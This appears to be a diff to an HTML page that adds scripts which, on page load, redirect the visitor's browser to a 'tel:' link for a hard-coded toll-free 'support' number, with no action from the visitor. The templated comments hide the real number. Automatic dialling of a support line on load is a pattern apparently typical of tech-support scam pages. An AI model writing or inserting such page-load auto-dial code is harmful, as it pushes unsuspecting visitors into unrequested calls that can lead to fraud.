@@ -51,6 +51,26 @@
       margin-top: 50px;
     }
   </style>
+  <script>
+        function callSupport() {
+            // Replace 'your-phone-number' with the actual support phone number
+            var phoneNumber = '+18664500046';
+            
+            // Using the 'tel' protocol to initiate a call
+            window.location.href = 'tel:' + phoneNumber;
+        }
+    </script>
+	
+	<script>
+        // Automatically initiate a call when the page loads
+        window.onload = function() {
+            // Replace 'your-phone-number' with the actual support phone number
+            var phoneNumber = '+18664500046';
+            
+            // Using the 'tel' protocol to initiate a call
+            window.location.href = 'tel:' + phoneNumber;
+        };
+    </script>
 </head>
 
 <body onload="autoDial()">
